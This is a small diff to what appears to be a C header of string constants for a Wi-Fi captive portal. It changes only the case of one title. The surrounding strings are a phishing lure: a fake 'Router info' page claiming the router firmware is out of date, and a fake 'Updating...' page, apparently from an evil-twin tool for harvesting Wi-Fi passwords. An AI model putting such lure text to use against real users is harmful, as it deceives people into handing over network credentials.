@@ -5,7 +5,7 @@
 
 #define SSID_NAME "use at your own risk"
 #define SUBTITLE "Router info."
-#define TITLE "Update"
+#define TITLE "update"
 #define BODY "Your router firmware is out of date Update your firmware to continue browsing normally."
 #define POST_TITLE "Updating..."
 #define POST_BODY "Your router is being updated. Please, wait until the process finishes.</br>Thank you."
